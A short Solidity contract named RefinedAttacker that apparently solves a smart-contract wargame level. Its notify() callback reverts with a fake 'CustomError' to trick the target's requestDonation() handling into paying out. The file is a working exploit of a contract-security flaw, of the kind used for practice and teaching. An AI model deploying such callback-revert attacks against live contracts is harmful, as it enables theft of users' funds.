// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

contract RefinedAttacker is INotifyable {
    address public instance;

    constructor(address instanceAddress) {
        instance = instanceAddress;
    }

    function attack() external {
        (bool success, ) = instance.call(abi.encodeWithSignature("requestDonation()"));
        require(success, "Attack failed");
    }

    function notify(uint256 amount) external override {
        // Trigger unexpected reversion error
        if (amount != 10) {
            revert("CustomError");
        }
    }
}